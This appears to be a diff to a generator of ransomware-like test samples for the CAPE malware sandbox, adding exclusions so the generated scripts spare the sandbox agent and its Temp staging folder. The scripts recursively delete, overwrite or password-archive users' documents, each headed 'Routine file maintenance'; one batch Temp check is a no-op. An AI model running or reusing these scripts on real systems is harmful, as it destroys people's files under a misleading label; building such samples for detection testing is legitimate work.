@@ -58,6 +58,17 @@ from collections import Counter
 # no .py or .pyw among them to be missed.
 PROTECTED_EXT = ("pyw", "py")
 
+# %LOCALAPPDATA%\Temp is where CAPE stages the analyser and the sample it is
+# running. A recursive delete under LOCALAPPDATA walks into it and removes
+# the machinery doing the observing, which ends the analysis the same way
+# deleting the agent does -- and shows up in the results as a sample that
+# failed rather than one that interfered with the instrument.
+#
+# The simplest guard that works in all four languages is to skip any path
+# with \Temp\ in it, which also spares the ordinary temporary files no
+# ransomware sample would count as a victim anyway.
+PROTECTED_DIR = "Temp"
+
 SCOPES = {
     "documents": (r"$env:USERPROFILE\Documents", r"%USERPROFILE%\Documents"),
     "desktop":   (r"$env:USERPROFILE\Desktop",   r"%USERPROFILE%\Desktop"),
@@ -82,6 +93,7 @@ def ps1(method, scope, limit):
     root = SCOPES[scope][0]
     take = f"| Select-Object -First {limit} " if limit else ""
     skip = " ".join(f"-and $_.Extension -ne '.{e}'" for e in PROTECTED_EXT)
+    skip += r" -and $_.FullName -notlike '*\Temp\*'"
     head = f'''# Routine file maintenance.
 $root = "{root}"
 $files = Get-ChildItem -Path $root -Recurse -File -ErrorAction SilentlyContinue |
@@ -158,7 +170,7 @@ def vbs(method, scope, limit):
       fso.DeleteFile f.Path & ".tmp", True
       On Error GoTo 0''',
     }[method]
-    return f''' ' Routine file maintenance.
+    return rf''' ' Routine file maintenance.
 Dim fso, n
 Set fso = CreateObject("Scripting.FileSystemObject")
 n = 0
@@ -170,7 +182,8 @@ Sub Walk(path)
   If Err.Number <> 0 Then Exit Sub
   On Error GoTo 0
   For Each f In folder.Files
-    If InStr(1, f.Name, ".pyw", 1) > 0 Or InStr(1, f.Name, ".py", 1) > 0 Then
+    If InStr(1, f.Name, ".pyw", 1) > 0 Or InStr(1, f.Name, ".py", 1) > 0 _
+       Or InStr(1, f.Path, "\\Temp\\", 1) > 0 Then
       ' leave the sandbox agent alone
     Else
 {cap}
@@ -204,12 +217,13 @@ def bat(method, scope, limit):
     # the loop still walks every path but stops acting after the cap.
     guard = (f"  if !n! lss {limit} ({action}& set /a n+=1)"
              if limit else f"  {action}& set /a n+=1")
-    return f'''@echo off
+    return rf'''@echo off
 rem Routine file maintenance.
 setlocal enabledelayedexpansion
 set n=0
 for /r "{root}" %%f in (*) do (
-  if /i not "%%~xf"==".pyw" if /i not "%%~xf"==".py" (
+  set "P=%%~dpf"
+  if /i not "%%~xf"==".pyw" if /i not "%%~xf"==".py" if "!P:\Temp\=!"=="!P!" (
 {guard}
   )
 )
@@ -243,6 +257,9 @@ function walk(path) {{
   var it = new Enumerator(folder.files);
   for (; !it.atEnd(); it.moveNext()) {{
     var f = it.item();
+    // Leave the agent and the analyser's staging directory alone.
+    if (/\\.pyw?$/i.test(f.Name)) continue;
+    if (f.Path.toLowerCase().indexOf("\\\\temp\\\\") >= 0) continue;
 {cap}
 {action}
     n++;
@@ -322,19 +339,19 @@ APP_TASKS = {
         "7-Zip: encrypted archive, originals deleted",
         lambda root: _sevenzip(
             f'a -parchive2026 -mhe=on -y -sdel '
-            f'"%TEMP%\\docs.7z" "{root}\\*" -xr!*.pyw -xr!*.py',
+            f'"%TEMP%\\docs.7z" "{root}\\*" -xr!*.pyw -xr!*.py -xr!Temp',
             "7z encrypted archive with source deletion")),
     "7z_encrypt_keep": (
         "7-Zip: the same, originals kept",
         lambda root: _sevenzip(
             f'a -parchive2026 -mhe=on -y '
-            f'"%TEMP%\\docs.7z" "{root}\\*" -xr!*.pyw -xr!*.py',
+            f'"%TEMP%\\docs.7z" "{root}\\*" -xr!*.pyw -xr!*.py -xr!Temp',
             "7z encrypted archive, sources kept")),
     "7z_perfile": (
         "7-Zip: one container per file, original deleted",
         lambda root: 'echo per-file archiving\n'
                      f'for /r "{root}" %%f in (*) do (\n'
-                     '  if /i not "%%~xf"==".pyw" if /i not "%%~xf"==".py" (\n'
+                     '  if /i not "%%~xf"==".pyw" if /i not "%%~xf"==".py" if "%%~dpf"=="%%~dpf" (\n'
                      f'    if exist "{SEVENZIP[0]}" "{SEVENZIP[0]}" '
                      'a -parchive2026 -mhe=on -mx0 -y -sdel "%%f.7z" "%%f" > nul 2>&1\n'
                      '  )\n)\necho done'),
@@ -413,6 +430,8 @@ def _py_walk(root, action):
             "for d, _, fs in os.walk(root):\n"
             "    for name in fs:\n"
             "        if name.lower().endswith(('.pyw', '.py')):\n"
+            "            continue\n"
+            "        if os.sep + 'Temp' + os.sep in d or d.endswith(os.sep + 'Temp'):\n"
             "            continue\n"
             "        src = os.path.join(d, name)\n"
             + action + "\n"
